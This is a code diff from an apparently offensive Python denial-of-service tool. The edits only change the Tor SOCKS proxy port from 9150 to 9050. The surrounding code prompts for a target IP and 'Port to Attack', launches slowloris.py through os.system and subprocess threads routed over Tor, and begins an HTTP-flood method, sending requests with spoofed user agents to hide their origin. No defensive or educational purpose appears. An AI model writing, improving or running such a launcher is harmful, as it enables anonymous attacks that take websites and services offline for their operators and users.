@@ -60,14 +60,14 @@ def make_request(url, user_agent, option):
             response = requests.get(url, headers=headers, timeout=1)
             print(f"Response Code: {response.status_code}")
         elif option == 2:
-            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+            proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
             headers = {'User-Agent': user_agent}
             response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
             print(f'Response Code: {response.status_code}')
         
         elif option == 6:
             headers = {'User-Agent': user_agent}
-            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+            proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
             response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
 
     except requests.exceptions.RequestException as e:
@@ -188,7 +188,7 @@ if __name__ == '__main__':
             ip = input('IP (Domain) => ')
             p = int(input('Port to Attack => '))
             sc = int(input('Socket Count => '))
-            os.system(f'python3 slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 {ip} -p {p} -s {sc}')
+            os.system(f'python3 slowloris.py --proxy-host 127.0.0.1 --proxy-port 9050 {ip} -p {p} -s {sc}')
         
         elif option == 6:
             ip = input('IP => ')
@@ -198,7 +198,7 @@ if __name__ == '__main__':
             t_count = int(input('Number of threads => '))
 
             print('Slowloris Attack...')
-            slowloris_thread = threading.Thread(target=subprocess.run, args=(['python3', 'slowloris.py --proxy-host 127.0.0.1 --proxy-port 9150 ', ip, '-p', str(p), '-s', str(sc)],))
+            slowloris_thread = threading.Thread(target=subprocess.run, args=(['python3', 'slowloris.py --proxy-host 127.0.0.1 --proxy-port 9050 ', ip, '-p', str(p), '-s', str(sc)],))
             slowloris_thread.start()
 
             print('HTTP-Flood Method...')
